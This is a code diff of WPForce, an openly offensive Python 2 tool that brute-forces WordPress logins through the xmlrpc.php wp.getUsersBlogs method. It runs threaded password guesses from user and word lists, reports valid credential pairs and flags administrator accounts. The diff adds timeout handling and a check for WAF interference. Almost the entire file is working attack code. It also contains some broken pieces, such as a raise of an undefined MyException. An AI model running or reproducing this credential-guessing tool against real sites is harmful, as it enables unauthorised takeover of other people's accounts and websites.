@@ -1,12 +1,9 @@
-#########
-#Import Libraries
-import urllib2
-import threading
-import argparse
 import sys
 import time
-from socket import error as SocketError
-BLACK, RED, GREEN, YELLOW, BLUE, MAGENTA, CYAN, WHITE = range(8)
+import socket
+import urllib2
+import argparse
+import threading
 __author__ = 'Esteban Rodriguez (n00py)'
 def has_colours(stream):
     if not hasattr(stream, "isatty"):
@@ -20,6 +17,7 @@ def has_colours(stream):
     except:
         return False
 has_colours = has_colours(sys.stdout)
+BLACK, RED, GREEN, YELLOW, BLUE, MAGENTA, CYAN, WHITE = range(8)
 def printout(text, colour=WHITE):
         if has_colours:
                 seq = "\x1b[1;%dm" % (30+colour) + text + "\x1b[0m"
@@ -49,7 +47,7 @@ def worker(wordlist,thread_no,url):
             user = userlist[current_user]
             password = wordlist[current_pass]
             if user not in correct_pairs:
-                PasswordAttempt(user,password,url)
+                PasswordAttempt(user,password,url,thread_no)
         total += 1
 def BuildThreads(list_array,url):
     if (args.debug == True):
@@ -89,7 +87,10 @@ def TestSite(url):
     except urllib2.URLError, g:
         printout("Could not identify XMLRPC.  Please verify it's existance.\n", YELLOW)
         sys.exit()
-def PasswordAttempt(user,password,url):
+    except socket.timeout as e:
+        print type(e)  # catched
+        raise MyException("The socket timed out, try it again.  (Site may down)")
+def PasswordAttempt(user,password,url,thread_no):
     if (args.verbose == True or args.debug == True):
         try_log = ""
         if (args.debug == True):
@@ -101,26 +102,43 @@ def PasswordAttempt(user,password,url):
                'Accept': 'text/html'
                }
     post = "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>" + user + "</string></value></param><param><value><string>" + password + "</string></value></param></params></methodCall>"
-    req = urllib2.Request(url, post, headers)
-    response = urllib2.urlopen(req, timeout=3)
-    the_page = response.read()
-    look_for = "isAdmin"
     try:
-        splitter = the_page.split(look_for, 1)[1]
-        correct_pairs[user] = password
-        print "--------------------------"
-        success = "[" + user + " : " + password + "] are valid credentials!  "
-        adminAlert = ""
-        if (splitter[23] == "1"):
-            adminAlert = "- THIS ACCOUNT IS ADMIN"
-        printout(success, GREEN)
-        printout(adminAlert, RED)
-        print "\n--------------------------"
-        adminAlert = ""
-    except:
-        pass
+        req = urllib2.Request(url, post, headers)
+        response = urllib2.urlopen(req, timeout=3)
+        the_page = response.read()
+        look_for = "isAdmin"
+        try:
+            splitter = the_page.split(look_for, 1)[1]
+            correct_pairs[user] = password
+            print "--------------------------"
+            success = "[" + user + " : " + password + "] are valid credentials!  "
+            adminAlert = ""
+            if (splitter[23] == "1"):
+                adminAlert = "- THIS ACCOUNT IS ADMIN"
+            printout(success, GREEN)
+            printout(adminAlert, RED)
+            print "\n--------------------------"
+            adminAlert = ""
+        except:
+            pass
+    except urllib2.URLError, e:
+        if e.code == 404:
+            global total
+            printout(str(e), YELLOW)
+            print " - WAF or security plugin likely in use"
+            total = len(passlist)
+            sys.exit()
+        else:
+            printout(str(e), YELLOW)
+            print " - Try reducing Thread count "
+            if (args.verbose == True or args.debug == True):
+                print user + ":" + password +" was skipped"
+    except socket.timeout as e:
+        printout(str(e), YELLOW)
+        print " - Try reducing Thread count "
+        if (args.verbose == True or args.debug == True):
+            print user + ":" + password + " was skipped"
 #-----------------------------------------------------------------------------------------------------------------------------------------------
-
 parser = argparse.ArgumentParser(description='This is a tool to brute force Worpress using the Wordpress API')
 parser.add_argument('-i','--input', help='Input file name',required=True)
 parser.add_argument('-w','--wordlist',help='Wordlist file name', required=True)
@@ -130,19 +148,17 @@ parser.add_argument('-t','--threads',help=' Determines the number of threads to 
 parser.add_argument('-a','--agent',help=' Determines the user-agent', type=str, default="WPForce Wordpress Attack Tool 1.0", required=False)
 parser.add_argument('-d','--debug',help=' This option is used for determining issues with the script.', action='store_true', required=False)
 args = parser.parse_args()
-website = args.url
-threads = args.threads
-url = website +'/xmlrpc.php'
+url = args.url +'/xmlrpc.php'
 u = open(args.input, 'r')
 userlist = u.read().split('\n')
 totalusers = len(userlist)
 f = open(args.wordlist, 'r')
 passlist = f.read().split('\n')
-total = 0
 correct_pairs ={}
 PrintBanner()
 TestSite(url)
-list_array = slice_list(passlist, threads)
+total = 0
+list_array = slice_list(passlist, args.threads)
 BuildThreads(list_array,url)
 while ((len(correct_pairs) <= totalusers) and  (len(passlist) > total)):
         time.sleep(0.1)
